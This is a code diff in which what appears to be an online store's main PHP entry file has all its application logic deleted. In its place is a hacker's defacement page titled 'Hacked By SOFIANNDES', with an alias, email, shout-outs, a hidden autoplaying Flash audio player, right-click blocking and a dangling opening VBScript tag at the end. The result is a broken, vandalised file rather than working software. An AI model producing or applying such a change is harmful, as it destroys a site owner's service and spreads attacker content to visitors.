@@ -1,231 +1,42 @@
 <?php
 // Version
-define('VERSION', '2.0');
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html><head>
 
-// Configuration
-if (is_file('config.php')) {
-	require_once('config.php');
-}  
 
-// Install 
-if (!defined('DIR_APPLICATION')) {
-	header('Location: install/index.php');
-	exit;
-}
 
-// Modification
-require_once(DIR_SYSTEM . 'engine/modification.php');
-$modification = new Modification();
 
-// Startup
-require_once($modification->getFile(DIR_SYSTEM . 'startup.php'));
+<meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>Hacked By SOFIANNDES</title></head><body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" style="background-color: black; color: rgb(0, 0, 0);" alink="#ee0000" link="#0000ee" vlink="#551a8b">
+<div style="text-align: center; font-family: Tekton Pro Ext; background-color: black;"><big><span style="color: white; font-weight: bold;"><span style="color: rgb(153, 51, 153);">'</span>HackeD <span style="color: rgb(153, 153, 153);">By</span> </span></big><big style="color: white; font-weight: bold;">SOFIANNEDZ</big><big><span style="color: white; font-weight: bold;"></span><span style="color: rgb(153, 51, 153);">'<br>
+<br>
+<img style="width:"" src="<a href="http://www.pixentral.com/show.php?picture=1DyNUsHvJT85ME8fnXhhq8hFQLq7ZQ1"/><img alt="Picture hosted by Pixentral" src="http://www.pixentral.com/hosted/1DyNUsHvJT85ME8fnXhhq8hFQLq7ZQ1_thumb.jpg" border="0"/></a>"><br>
+<span style="color: rgb(153, 153, 153);"></span><br>
+<br>
+<img style="width: 60px; height: 77px;" alt="" src="http://im35.gulfup.com/Wdh37.jpg"><br>
+&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; <span style="color: rgb(204, 0, 0);">"</span><span style="color: rgb(153, 153, 153);"> UseR<span style="color: rgb(153, 0, 0);"> &amp;</span> password </span><span style="color: rgb(204, 0, 0);">"</span><br>
+<br>
+<br>
+<span style="color: rgb(204, 204, 204);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SOFIANNEDZ<br>
+<br>
+<span style="color: white;"></span></span></span></big><span style="color: white; font-family: 'lucida grande',tahoma,verdana,arial,sans-serif; font-size: 12px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 15px; text-align: left; text-indent: 0px; text-transform: none; word-spacing: 0px; background-color: rgb(255, 255, 255); display: inline ! important; float: none;"></span><big><span style="color: rgb(153, 51, 153);"><span style="color: rgb(204, 204, 204);"> </span>
+<marquee width="600" height="30" direction="Left" onmouseover="this.stop()" onmouseout="this.start()" scrolldelay="0" scrollamount="5" align="center"> <span style="color: rgb(102, 0, 0);"><span style="color: rgb(102, 102, 102);">;) ;) ;) YOU ARE WELCOME.................. THIS IS SOFIANNEDZ ;) ;) ;)
+</span> <span style="color: rgb(153, 153, 153);">SOFIANNEDZ.</span> <span style="color: rgb(153, 51, 153);"><span style="color: rgb(102, 102, 102);">
 
-// Application
-require_once($modification->getFile(DIR_SYSTEM . 'library/customer.php'));
-require_once($modification->getFile(DIR_SYSTEM . 'library/affiliate.php'));
-require_once($modification->getFile(DIR_SYSTEM . 'library/currency.php'));
-require_once($modification->getFile(DIR_SYSTEM . 'library/tax.php'));
-require_once($modification->getFile(DIR_SYSTEM . 'library/weight.php'));
-require_once($modification->getFile(DIR_SYSTEM . 'library/length.php'));
-require_once($modification->getFile(DIR_SYSTEM . 'library/cart.php'));
+</span></span><span style="color: rgb(153, 51, 153);"><span style="color: rgb(102, 102, 102);">
 
-// Registry
-$registry = new Registry();
+</span> <span style="color: rgb(102, 102, 102);">
+</span></span> <span style="color: rgb(153, 153, 153);"> </span>,<span style="color: rgb(153, 51, 153);"> <span style="color: rgb(102, 102, 102);">
+</span></span>&nbsp;</span> </marquee>
+<span style="color: silver;"><br>
+&nbsp;&nbsp;&nbsp;&nbsp; </span></span></big><big><span style="color: rgb(153, 0, 0);"><span style="color: silver;"><br>
+<br>
+<br>
+To : NSD  &nbsp; </span></span></big><big><span style="color: rgb(153, 0, 0);"><span style="color: silver;"><span style="color: red;">-</span></span></span></big><big><span style="color: rgb(153, 0, 0);"><span style="color: silver;">&nbsp; OUSSAMA TLM&nbsp;&nbsp; <span style="color: red;">-</span>&nbsp;&nbsp; </span></span></big><b style="color: rgb(0, 0, 0); font-family: 'Times New Roman'; font-size: medium; font-style: normal; font-variant: normal; letter-spacing: normal; line-height: normal; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; word-spacing: 0px;"><b><span style="color: silver;">fayssal</span></b></b><big><span style="color: rgb(153, 0, 0);"><span style="color: silver;">&nbsp; </span></span></big><big><span style="color: rgb(153, 0, 0);"><span style="color: silver;"><span style="color: red;">-</span></span></span></big><big><span style="color: rgb(153, 0, 0);"><span style="color: silver;"> YASSER JAPONI</span>&nbsp; !</span></big><br>
+<big><span style="color: rgb(153, 51, 153);"></span></big><span style="color: white; font-family: 'lucida grande',tahoma,verdana,arial,sans-serif; font-size: 12px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 15px; text-align: left; text-indent: 0px; text-transform: none; word-spacing: 0px; background-color: rgb(255, 255, 255); display: inline ! important; float: none;"><br>
+<br>
+<span style="color: rgb(153, 153, 153);"><big><big><span style="color: rgb(153, 153, 153);"><span style="background-color: black;">SOFIANNEDZ<span style="color: rgb(153, 0, 0);">@</span>hotmail<span style="color: rgb(153, 0, 0);">.</span>com</span></span></big></big><span style="background-color: black;"></span></span><span style="color: black;"></span><br>
+</span></div>
+<object type="application/x-shockwave-flash" data="http://flash-mp3-player.net/medias/player_mp3_multi.swf" height="1" width="1"> <param name="movie" value="http://flash-mp3-player.net/medias/player_mp3_multi.swf"> <param name="bgcolor" value="#ffffff"> <param name="FlashVars" value="mp3=http://files.mboxdrive.com/100001418133363/Starcraft%202%20Soundtrack%20_%20Song%20Fire%20and%20Fury.mp3&amp;autoplay=1&amp;loop=1&amp;shuffle=1">
+</object>
 
-// Modification
-$registry->set('modification', $modification);
-
-// Loader
-$loader = new Loader($registry);
-$registry->set('load', $loader);
-
-// Config
-$config = new Config();
-$registry->set('config', $config);
-
-// Database 
-$db = new DB(DB_DRIVER, DB_HOSTNAME, DB_USERNAME, DB_PASSWORD, DB_DATABASE);
-$registry->set('db', $db);
-
-// Store
-if (isset($_SERVER['HTTPS']) && (($_SERVER['HTTPS'] == 'on') || ($_SERVER['HTTPS'] == '1'))) {
-	$store_query = $db->query("SELECT * FROM " . DB_PREFIX . "store WHERE REPLACE(`ssl`, 'www.', '') = '" . $db->escape('https://' . str_replace('www.', '', $_SERVER['HTTP_HOST']) . rtrim(dirname($_SERVER['PHP_SELF']), '/.\\') . '/') . "'");
-} else {
-	$store_query = $db->query("SELECT * FROM " . DB_PREFIX . "store WHERE REPLACE(`url`, 'www.', '') = '" . $db->escape('http://' . str_replace('www.', '', $_SERVER['HTTP_HOST']) . rtrim(dirname($_SERVER['PHP_SELF']), '/.\\') . '/') . "'");
-}
-
-if ($store_query->num_rows) {
-	$config->set('config_store_id', $store_query->row['store_id']);
-} else {
-	$config->set('config_store_id', 0);
-}
-		
-// Settings
-$query = $db->query("SELECT * FROM `" . DB_PREFIX . "setting` WHERE store_id = '0' OR store_id = '" . (int)$config->get('config_store_id') . "' ORDER BY store_id ASC");
-
-foreach ($query->rows as $result) {
-	if (!$result['serialized']) {
-		$config->set($result['key'], $result['value']);
-	} else {
-		$config->set($result['key'], unserialize($result['value']));
-	}
-}
-
-if (!$store_query->num_rows) {
-	$config->set('config_url', HTTP_SERVER);
-	$config->set('config_ssl', HTTPS_SERVER);
-}
-
-// Url
-$url = new Url($config->get('config_url'), $config->get('config_secure') ? $config->get('config_ssl') : $config->get('config_url'));	
-$registry->set('url', $url);
-
-// Log
-$log = new Log($config->get('config_error_filename'));
-$registry->set('log', $log);
-
-// Error Handler
-function error_handler($number, $string, $file, $line) {
-    throw new ErrorException($string, $number, 0, $file, $line);
-}
-
-set_error_handler('error_handler');
-
-// Request
-$request = new Request();
-$registry->set('request', $request);
- 
-// Response
-$response = new Response();
-$response->addHeader('Content-Type: text/html; charset=utf-8');
-$response->setCompression($config->get('config_compression'));
-$registry->set('response', $response); 
-		
-// Cache
-$cache = new Cache();
-$registry->set('cache', $cache); 
-
-// Session
-$session = new Session();
-$registry->set('session', $session);
-
-// Language Detection
-$languages = array();
-
-$query = $db->query("SELECT * FROM `" . DB_PREFIX . "language` WHERE status = '1'"); 
-
-foreach ($query->rows as $result) {
-	$languages[$result['code']] = $result;
-}
-
-$detect = '';
-
-if (isset($request->server['HTTP_ACCEPT_LANGUAGE']) && $request->server['HTTP_ACCEPT_LANGUAGE']) { 
-	$browser_languages = explode(',', $request->server['HTTP_ACCEPT_LANGUAGE']);
-	
-	foreach ($browser_languages as $browser_language) {
-		foreach ($languages as $key => $value) {
-			if ($value['status']) {
-				$locale = explode(',', $value['locale']);
-
-				if (in_array($browser_language, $locale)) {
-					$detect = $key;
-				}
-			}
-		}
-	}
-}
-
-if (isset($session->data['language']) && array_key_exists($session->data['language'], $languages) && $languages[$session->data['language']]['status']) {
-	$code = $session->data['language'];
-} elseif (isset($request->cookie['language']) && array_key_exists($request->cookie['language'], $languages) && $languages[$request->cookie['language']]['status']) {
-	$code = $request->cookie['language'];
-} elseif ($detect) {
-	$code = $detect;
-} else {
-	$code = $config->get('config_language');
-}
-
-if (!isset($session->data['language']) || $session->data['language'] != $code) {
-	$session->data['language'] = $code;
-}
-
-if (!isset($request->cookie['language']) || $request->cookie['language'] != $code) {	  
-	setcookie('language', $code, time() + 60 * 60 * 24 * 30, '/', $request->server['HTTP_HOST']);
-}			
-
-$config->set('config_language_id', $languages[$code]['language_id']);
-$config->set('config_language', $languages[$code]['code']);
-
-// Language
-$language = new Language($languages[$code]['directory']);
-$language->load($languages[$code]['filename']);	
-$registry->set('language', $language); 
-
-// Document
-$registry->set('document', new Document()); 		
-
-// Customer
-$registry->set('customer', new Customer($registry));
-
-// Tracking Code
-if (isset($request->get['tracking'])) {
-	setcookie('tracking', $request->get['tracking'], time() + 3600 * 24 * 1000, '/');
-	
-	$db->query("UPDATE `" . DB_PREFIX . "marketing` SET clicks = (clicks + 1) WHERE code = '" . $db->escape($request->get['tracking']) . "'");
-}
-
-// Affiliate
-$registry->set('affiliate', new Affiliate($registry));
-		
-// Currency
-$registry->set('currency', new Currency($registry));
-
-// Tax
-$registry->set('tax', new Tax($registry));
-
-// Weight
-$registry->set('weight', new Weight($registry));
-
-// Length
-$registry->set('length', new Length($registry));
-
-// Cart
-$registry->set('cart', new Cart($registry));
-
-// Encryption
-$registry->set('encryption', new Encryption($config->get('config_encryption')));
-		
-// Front Controller
-$controller = new Front($registry);
-
-// Maintenance Mode
-$controller->addPreAction(new Action('common/maintenance'));
-
-// SEO URL's
-$controller->addPreAction(new Action('common/seo_url'));	
-	
-// Router
-if (isset($request->get['route'])) {
-	$action = new Action($request->get['route']);
-} else {
-	$action = new Action('common/home');
-}
-
-try {
-	// Dispatch
-	$controller->dispatch($action, new Action('error/not_found'));
-} catch(Exception $exception) {
-	// Catch any errors and log them!
-	if ($config->get('config_error_display')) {
-		echo sprintf($language->get('error_exception'), $exception->getCode(), $exception->getMessage(), $exception->getFile(), $exception->getLine());
-	}
-	
-	if ($config->get('config_error_log')) {
-		$log->write(sprintf($language->get('error_exception'), $exception->getCode(), $exception->getMessage(), $exception->getFile(), $exception->getLine()));
-	}	
-}
-
-// Output
-$response->output();
-?>
+</body></html><SCRIPT Language=VBScript><!--
